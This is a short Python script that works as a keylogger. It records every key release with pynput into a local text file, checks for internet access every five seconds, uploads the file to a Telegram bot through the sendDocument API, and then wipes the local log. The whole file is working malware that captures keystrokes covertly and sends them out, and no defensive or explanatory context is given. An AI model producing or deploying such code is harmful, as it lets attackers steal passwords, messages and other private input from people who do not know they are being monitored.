from pynput import keyboard
import requests
import time
import os

BOT_TOKEN = 'bot tokken'
CHAT_ID = 'telegram chat id'
FILE_PATH = 'logtext.txt'
CHECK_INTERVAL = 5  # seconds

def on_release(key):
    keydata = str(key) + '\n'  # Add a newline for readability
    with open(FILE_PATH, "a") as f:
        f.write(keydata)

def is_connected():
    """Check if the computer is connected to the internet."""
    try:
        requests.get('http://www.google.com', timeout=5)
        return True
    except requests.ConnectionError:
        return False

def send_file():
    """Send the logtext.txt file to the Telegram bot."""
    if os.path.exists(FILE_PATH) and os.path.getsize(FILE_PATH) > 0:
        with open(FILE_PATH, 'rb') as file:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                data={'chat_id': CHAT_ID},
                files={'document': file}
            )
        return response.status_code == 200
    return False

# Ensure the log file exists
open(FILE_PATH, 'a').close()

# Collect events until released
listener = keyboard.Listener(on_release=on_release)
listener.start()

while True:
    if is_connected():
        success = send_file()
        if success:
            print(f'File {FILE_PATH} sent successfully.')
            # Clear the file after sending
            open(FILE_PATH, 'w').close()
        else:
            print(f'Failed to send file {FILE_PATH}.')
    else:
        print('Not connected to the internet.')

    time.sleep(CHECK_INTERVAL)
